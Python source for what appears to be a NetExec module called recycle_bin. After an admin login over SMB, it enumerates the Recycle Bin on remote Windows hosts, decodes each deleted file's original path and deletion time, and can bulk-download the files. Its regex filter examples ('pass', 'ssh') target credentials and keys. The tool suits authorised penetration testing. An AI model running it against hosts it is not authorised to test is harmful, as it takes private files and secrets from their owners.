from io import BytesIO
from os import makedirs
from os.path import join, abspath
from nxc.paths import NXC_PATH
import re
from datetime import datetime, timedelta
import struct

# TODO handle directories in the Recycle Bin as well as single files

class NXCModule:
    # Finds files in the Recycle Bin
    # Module by @leDryPotato

    name = "recycle_bin"
    description = "Lists (and downloads) files in the Recycle Bin."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    false_positive = [".", "..", "desktop.ini", "S-1-5-18"]
    
    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """
        DOWNLOAD    Download the files in the Recycle Bin (default: False)
            Example: -o DOWNLOAD=True
        FILTER      Filter what files you want to download (default: all) based on their original location, supports regular expressions
            Examples: -o FILTER=pass
                      -o FILTER=ssh
        """
        self.download = bool(module_options.get("DOWNLOAD", False))
        self.filter = module_options.get("FILTER", "all")

    def read_file(self, connection, context, file_path):
        buf = BytesIO()
        try:
            connection.conn.getFile("C$", file_path, buf.write)
        except Exception as e:
            context.log.debug(f"Cannot read file {file_path}: {e}")

        buf.seek(0)
        return buf.read()

    def convert_filetime_to_datetime(self, filetime):
        """Convert Windows FILETIME to a readable timestamp rounded to the closest minute."""
        try:
            WINDOWS_EPOCH = datetime(1601, 1, 1)  # Windows FILETIME epoch

            timestamp = filetime / 10_000_000  # Convert 100-ns intervals to seconds
            dt = WINDOWS_EPOCH + timedelta(seconds=timestamp)
            return dt.replace(microsecond=0)
        except Exception:
            return "Conversion Error"

    def on_admin_login(self, context, connection):
        metadata_map = {}
        
        for directory in connection.conn.listPath("C$", "$Recycle.Bin\\*"):
            if directory.get_longname() not in self.false_positive and directory.is_directory():
                # Each directory corresponds to a different user account, the SID identifies the user
                sid_dir = f"$Recycle.Bin\\{directory.get_longname()}"
                if (sid_dir is not None):
                    context.log.highlight(f"Found directory {sid_dir}")

                for file in connection.conn.listPath("C$", f"{sid_dir}\\*"):
                    # File naming convention for files in the Recycle Bin
                    # $R<random>: actual file content
                    # $I<random>: associated metadata file
                    try:
                        # Metadata files (start with $I)
                        if file.get_longname() not in self.false_positive and file.get_longname().startswith("$I"):
                            file_path = f"{sid_dir}\\{file.get_longname()}"

                            # The structure of the metadata file contains the file deletion time, the file size and the original file path
                            data = self.read_file(connection, context, file_path)
                            # Get original location/deletion time of the deleted file from the associated metadata file, this can help determine if we want to download it or not
                            if len(data) < 24:
                                context.log.info(f"\tInvalid metadata file: {file.get_longname()} (too small: {len(data)} bytes)")
                            else:
                                # Read 8 bytes for the deletion time
                                deletion_time_raw, = struct.unpack("<Q", data[16:24]) 
                                deletion_time = self.convert_filetime_to_datetime(deletion_time_raw)

                                # Read from byte 24 to the end for the original path
                                original_path = data[24:].decode("utf-16", errors="ignore").strip("\x00")
                                match = re.search(r"([a-z]:\\.+)", original_path, re.IGNORECASE)
                                if match:
                                    original_path = match.group(1)
                                    metadata_map[file.get_longname().replace("$I", "")] = original_path
                                    context.log.highlight(f"\tFile: {file.get_longname()}, Original location: {original_path}, Deletion time: {deletion_time}")
                    except struct.error as e:
                        context.log.debug(f"Error unpacking deletion time: {e}")
                    except Exception as e:
                        context.log.debug(f"Error parsing metadata file: {e}")
                    try:
                        # Actual files (start with $R)
                        if file.get_longname() not in self.false_positive and file.get_longname().startswith("$R"):
                            file_path = f"{sid_dir}\\{file.get_longname()}"
                            context.log.highlight(f"\tFile: {file.get_longname()}, size: {file.get_filesize()}KB")

                            # Download files if the module option is set
                            if self.download:
                                original_path = metadata_map.get(file.get_longname().replace("$R", ""), "unknown_file")
                                
                                # Apply filter if it's set (and not "all")
                                if self.filter and self.filter.lower() != "all":
                                    match = re.search(self.filter, original_path, re.IGNORECASE)
                                    if not match:
                                        context.log.info(f"\tSkipping file {file.get_longname()} ({original_path})")
                                        continue  # Skip downloading this file
                                
                                context.log.info(f"\tDownloading file {file.get_longname()} from {original_path}")

                                data = self.read_file(connection, context, file_path)

                                # Use binary mode to write files to prevent decoding errors
                                filename = f"{connection.host}_{original_path}"
                                export_path = join(NXC_PATH, "modules", "recycle_bin")
                                path = abspath(join(export_path, filename))
                                makedirs(export_path, exist_ok=True)

                                try:
                                    with open(path, "wb") as f:
                                        f.write(data)
                                    context.log.success(f"Recycle Bin file {file.get_longname()} written to: {path}")
                                except Exception as e:
                                    context.log.fail(f"Failed to write Recycle Bin file to {filename}: {e}")
                                        
                    except Exception as e:
                        context.log.debug(f"Error parsing content file: {e}")